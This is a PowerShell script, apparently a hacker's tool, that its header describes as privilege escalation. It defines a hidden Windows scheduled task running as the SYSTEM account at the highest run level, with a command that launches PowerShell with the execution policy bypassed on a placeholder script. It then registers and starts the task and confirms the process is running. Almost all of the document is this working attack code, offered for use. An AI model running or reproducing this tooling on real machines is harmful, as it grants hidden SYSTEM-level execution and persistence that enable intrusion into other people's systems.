# Author: phoogeveen aka x0xr00t
# Description: This script creates a scheduled task for privilege escalation by running a PowerShell script with the highest privileges.
# Version: 1.0
# Get the current system time
$currentDateTime = Get-Date
Write-Output "Current system time: $currentDateTime"

# Calculate the start time by adding 2 minutes to the current time
$startTime = $currentDateTime.AddMinutes(2)
Write-Output "Scheduled task will start at: $startTime"

# Format the start time for use in XML (in UTC format)
$formattedStartTime = $startTime.ToString("yyyy-MM-ddTHH:mm:ss")
Write-Output "Formatted start time for XML: $formattedStartTime"

# Define the XML for the scheduled task
$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$formattedStartTime</Date>
    <Author>NT AUTHORITY\SYSTEM</Author>
    <URI>\ElevatedTask</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>$formattedStartTime</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c start /b "" conhost.exe cmd.exe /K powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Path\To\Your\Script.ps1"</Arguments>
      <WorkingDirectory>C:\Path\To\Your\Directory\</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@

# Ensure that the scheduled task XML is valid
if (-not $taskXml) {
    Write-Error "Failed to create XML for scheduled task."
    exit
}

# Register the scheduled task with the XML definition
try {
    Register-ScheduledTask -Xml $taskXml -TaskName "ElevatedTask" -Force
    Write-Output "Scheduled task 'ElevatedTask' registered successfully."
} catch {
    Write-Error "Failed to register scheduled task: $_"
    exit
}

# Start the scheduled task immediately
try {
    Start-ScheduledTask -TaskName "ElevatedTask"
    Write-Output "Scheduled task 'ElevatedTask' started successfully."
} catch {
    Write-Error "Failed to start scheduled task: $_"
    exit
}

# Wait for the task to start (adjust time as needed)
Start-Sleep -Seconds 5  

# Get the process ID of the started task to verify it's running
try {
    $processId = Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like '*powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Path\To\Your\Script.ps1"'} | Select-Object -ExpandProperty ProcessId
    Write-Output "Process ID of the started process: $processId"
} catch {
    Write-Error "Failed to retrieve process ID: $_"
}
